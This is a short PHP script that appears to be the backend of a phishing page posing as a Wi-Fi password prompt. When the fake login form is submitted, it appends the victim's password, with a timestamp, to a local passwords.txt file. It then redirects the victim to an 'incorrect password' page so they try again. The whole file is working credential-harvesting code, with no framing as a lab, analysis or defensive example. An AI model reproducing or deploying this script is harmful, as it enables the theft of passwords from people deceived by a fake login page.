<?php

// extracting password via passwords.txt file
if(isset($_POST['log_in'])){ // Fetching variables of the form which travels in URL

$password = date("Y-m-d") . " " . date("h:i")." password: " . $_POST['pass'] . " \n";
$myfile = fopen("passwords.txt", "a") or die("Unable to open file!");

fwrite($myfile, $password);
fclose($myfile);
}
header("Location: http://127.0.0.1:8080/wifipassword/index.php?incorrect=true");
exit;
?>
